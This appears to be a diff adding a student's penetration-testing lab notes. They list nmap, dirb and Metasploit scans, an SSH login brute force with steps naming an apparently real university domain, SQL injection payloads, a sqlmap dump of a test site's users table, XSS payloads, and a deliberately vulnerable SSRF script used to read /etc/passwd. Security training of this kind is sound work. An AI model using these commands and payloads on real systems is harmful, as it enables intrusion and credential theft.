@@ -1,0 +1,121 @@
+1)web application and scan the WebApp using Wappalyzer, Nmap and Dirb options
+sudo service apache2 start
+sudo service apache2 status
+ifconfig
+cd /var/www/html
+sudo nano progarm1.html
+nmap <kali ip> -O -sV
+dirb http://<Kali Ip>/
+2)OSINT 
+OSINTframework.com, idcrawl.com, whatsmyname.me, spokeo.com, facecheck.id, haveibeenpwned.com, abuseipdb.com, opencorporates.com, ahmia.fi 
+3)
+wappalyzer extension, virustotal.com, who.is, dnsdumpster.com, www.shodan.io, github.com, web.archive.org, exif.tools, mapillary.com, https://livingatlas.arcgis.com/wayback/ 
+4)
+Metasploit auxiliary
+---------------------------------
+port_scanner :
+msfconsole
+search auxiliary portscane
+use 5  [tcp]
+set ports 1-1000
+options
+ping LJKU.EDU.IN
+set rhost <LJ_ip_add>
+run
+---------------------------------
+Version Grabing Http :
+search auxiliary http_version
+use 0
+options
+set rhost ip_add
+run
+---------------------------------
+Header Grabing (part of recon) :
+search auxiliary http_header
+use 16
+options
+set rhost ip_add
+run
+---------------------------------
+Apache_range_doc :
+search auxiliary apache_range_doc
+use 0
+options
+set rhost ip_add
+set port 1-1000
+set rlimit 500
+run
+---------------------------------
+SSH VERSION :
+search auxiliary ssh_version
+service ssh start
+use 3 [ssh_version]
+ifconfig
+options
+set rhosts ip_add
+run
+---------------------------------
+BRUTE FORCE SSH Login :
+search auxiliary ssh_login
+use 0
+options
+ping ljku.edu.in
+set rhost ip_add
+set verbose true
+nano users.txt
+cat users.txt
+nano pass.txt
+cat pass.txt
+options
+set user_file users.txt
+set pass_file pass.txt
+run
+=================================
+6)SQL vulnerabilities Burpsuite tool and portswigger lab academy.
+	a)Find hidden items in e-commerce website(lab-1)
+		- start froxy proxy
+		-start Burpsuite 
+		- Forward a request
+		- Filter Click 
+		- Burpsuite request category after write or 1=1--
+	b)
+	-my account
+	-start froxy proxy
+	-start Burpsuite
+	-Enter Email[administrator] and password
+	-change Burpsuite paswword [after usnername clear all]administrator'--
+7)SQL injection attack using sqlmap tool
+SQL Injection kali
+1.sqlmap -u http://testphp.vulnweb.com --crawl 2 --batch 
+2.cat /path.csv     [path will give in step 1 output]
+3.sqlmap -u http://testphp.vulnweb.com/artists.php?artists=1 -dbs
+4.sqlmap -u http://testphp.vulnweb.com/artists.php?artists=1 -D acuart --tables
+5.sqlmap -u http://testphp.vulnweb.com/artists.php?artists=1 -D acuart -T users --dump
+=================================
+8)DOM-based XSS vulnerabilities 
+	a)Insert XSS payload in search query
+	<script>alert(1)</script>[search bar]
+	b)Insert XSS payload in comment section.
+	-add comment in Burpsuite in comment section: <script>alert(1)</script>
+	c)Insert XSS payload in <img> element
+	- clcik a serch button
+	- Burpsuite serch after <img>"><svg onload=alert(1)></img>
+	<script>alert(1)</script>[search bar]
+9)SSRF URL search vulnerability
+sudo service apache2 start
+sudo service apache2 status
+cd /var/www/html
+sudo nano ssrf.php
+	<?php
+		if (isset($_GET['url'])) {
+			$url = $_GET['url'];
+			$response = file_get_contents($url);
+			echo $response;
+		} else {
+			echo 'Please provide a URL parameter.';
+		}
+	?>
+http:// 192.168.1.4/ssrf.php?url=/../../../../../../../../etc/passwd  [in browser]
+192.168.1.4/ssrf.php?url=file:///etc/passwd
+192.168.1.4/ssrf.php?url=file:///etc/fusc.conf
+192.168.1.4/ssrf.php?url=file:///var/www/html/admin.html
